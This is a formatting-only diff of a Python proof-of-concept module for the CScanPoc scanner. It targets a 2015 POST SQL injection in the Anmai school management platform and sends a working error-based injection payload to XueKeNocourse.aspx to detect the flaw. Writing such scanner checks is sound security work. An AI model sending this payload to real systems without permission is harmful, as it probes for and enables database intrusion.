@@ -1,21 +1,22 @@
 # coding: utf-8
 
-from CScanPoc.thirdparty import requests,hackhttp
+from CScanPoc.thirdparty import requests, hackhttp
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 hh = hackhttp.hackhttp()
 
+
 class Vuln(ABVuln):
-    vuln_id = 'Anmai_0006' # 平台漏洞编号，留空
-    name = '安脉学校综合管理平台 post注入' # 漏洞名称
-    level = VulnLevel.HIGH # 漏洞危害级别
-    type = VulnType.INJECTION # 漏洞类型
+    vuln_id = 'Anmai_0006'  # 平台漏洞编号，留空
+    name = '安脉学校综合管理平台 post注入'  # 漏洞名称
+    level = VulnLevel.HIGH  # 漏洞危害级别
+    type = VulnType.INJECTION  # 漏洞类型
     disclosure_date = '2015-07-20'  # 漏洞公布时间
     desc = '''
         安脉学校综合管理平台 /time/shezhiSystem/XueKeNocourse.aspx POST注入漏洞。
-    ''' # 漏洞描述
-    ref = 'Unknown' # 漏洞来源https://wooyun.shuimugan.com/bug/view?bug_no=0108502
-    cnvd_id = 'Unknown' # cnvd漏洞编号
-    cve_id = 'Unknown' #cve编号
+    '''  # 漏洞描述
+    ref = 'Unknown'  # 漏洞来源https://wooyun.shuimugan.com/bug/view?bug_no=0108502
+    cnvd_id = 'Unknown'  # cnvd漏洞编号
+    cve_id = 'Unknown'  # cve编号
     product = '安脉学校综合管理平台'  # 漏洞应用名称
     product_version = 'Unknown'  # 漏洞应用版本
 
@@ -23,7 +24,7 @@ class Vuln(ABVuln):
 class Poc(ABPoc):
     poc_id = '486e45a6-a13e-40de-9daa-f3a684c6463e'
     author = '国光'  # POC编写者
-    create_date = '2018-05-25' # POC创建时间
+    create_date = '2018-05-25'  # POC创建时间
 
     def __init__(self):
         super(Poc, self).__init__(Vuln())
@@ -34,10 +35,10 @@ class Poc(ABPoc):
                 target=self.target, vuln=self.vuln))
             arg = '{target}'.format(target=self.target)
             payload = "/time/shezhiSystem/XueKeNocourse.aspx"
-            data="Course=1%27%20and%20(CHAR(126)%2BCHAR(116)%2BCHAR(101)%2BCHAR(115)%2BCHAR(116)%2BCHAR(88)%2BCHAR(81)%2BCHAR(49)%2BCHAR(55))%3E0--"
-            url=arg+payload
-            code, head, res, errcode,finalurl =  hh.http(url,data)
-            if code == 500 or code ==200 and "testXQ17" in res:
+            data = "Course=1%27%20and%20(CHAR(126)%2BCHAR(116)%2BCHAR(101)%2BCHAR(115)%2BCHAR(116)%2BCHAR(88)%2BCHAR(81)%2BCHAR(49)%2BCHAR(55))%3E0--"
+            url = arg+payload
+            code, head, res, errcode, finalurl = hh.http(url, data)
+            if code == 500 or code == 200 and "testXQ17" in res:
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                     target=self.target, name=self.vuln.name))
 
